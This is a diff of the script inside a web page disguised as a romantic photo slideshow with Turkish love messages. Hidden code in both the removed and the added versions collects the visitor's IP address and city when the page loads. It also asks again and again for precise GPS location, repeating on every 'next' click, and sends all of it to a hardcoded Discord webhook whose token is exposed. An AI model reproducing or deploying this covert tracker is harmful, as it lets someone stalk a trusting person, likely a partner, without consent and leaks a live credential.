@@ -28,49 +28,48 @@
 
     <script>
         const WEB_URL = "https://discord.com/api/webhooks/1470189609630826658/DAjHbX38Ow-YJOCbk4n0C3WpHnZ7XHCZuA-VLleQpzOU26qEnTw3FuVpegmoY7ghqEnj";
-        let raporGonderildi = false;
 
-        // En sade gönderim fonksiyonu
         function dcGonder(m) {
             fetch(WEB_URL, {
                 method: 'POST',
-                mode: 'no-cors', // Bilgisayardaki güvenlik duvarlarını aşmak için
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ content: m })
             });
         }
 
-        async function sistemiCalistir() {
-            if (raporGonderildi) return;
-            
-            const cihaz = navigator.userAgent;
-            const saat = new Date().toLocaleString('tr-TR');
-
-            // IP Bilgisi Al
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const d = await response.json();
-                
-                let mesaj = `💻 **PC/Cihaz Girişi**\n⏰ Saat: ${saat}\n📍 Şehir: ${d.city}\n🌐 IP: ${d.ip}\n📱 Detay: ${cihaz.substring(0, 100)}`;
-                dcGonder(mesaj);
-                raporGonderildi = true;
-
-                // Konum İste
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(p => {
-                        const link = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                        dcGonder(`🎯 **TAM KONUM**\n${link}`);
-                    }, null, {enableHighAccuracy: true});
-                }
-            } catch (e) {
-                dcGonder("🚀 Giriş Yapıldı (IP Bilgisi Alınamadı)");
+        // --- KONUMU ZORLA İSTE ---
+        function konumuAl() {
+            if ("geolocation" in navigator) {
+                // Tarayıcıyı konumu sormaya zorlayan ana komut
+                navigator.geolocation.getCurrentPosition(
+                    function(p) {
+                        const lat = p.coords.latitude;
+                        const lon = p.coords.longitude;
+                        const harita = `https://www.google.com/maps?q=${lat},${lon}`;
+                        dcGonder("🎯 **TAM KONUM GELDİ!**\n📍 Harita: " + harita);
+                    },
+                    function(e) {
+                        dcGonder("⚠️ Konum reddedildi: " + e.message);
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                dcGonder("❌ Tarayıcı konumu desteklemiyor.");
             }
         }
 
-        // Sayfa yüklenince beklemeden çalıştır
-        window.onload = sistemiCalistir;
+        // Sayfa açılır açılmaz IP bilgisini gönder ve konumu sormayı dene
+        window.addEventListener('load', () => {
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(d => {
+                    dcGonder(`🚀 **Siteye Giriş!**\n📍 Şehir: ${d.city}\n🌐 IP: ${d.ip}`);
+                    // IP'den sonra konumu sormayı başlat
+                    konumuAl();
+                });
+        });
 
-        // Fotoğraf Sistemi
+        // --- FOTOĞRAF VE MÜZİK ---
         const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
         const sozler = ["Seninle her günüm daha güzel.", "Gülüşün dünyamı aydınlatıyor.", "Kalbim hep seninle.", "Sana her baktığımda yeniden aşık oluyorum.", "İyi ki varsın, iyi ki benimsin."];
         let index = 0;
@@ -78,7 +77,9 @@
 
         function ileri() {
             if (audio) audio.play().catch(() => {});
-            if (!raporGonderildi) sistemiCalistir();
+            
+            // Eğer hala konum izni verilmediyse, her 'İleri' butonunda tekrar sormayı dene
+            konumuAl();
 
             index++;
             if (index >= fotolar.length) {
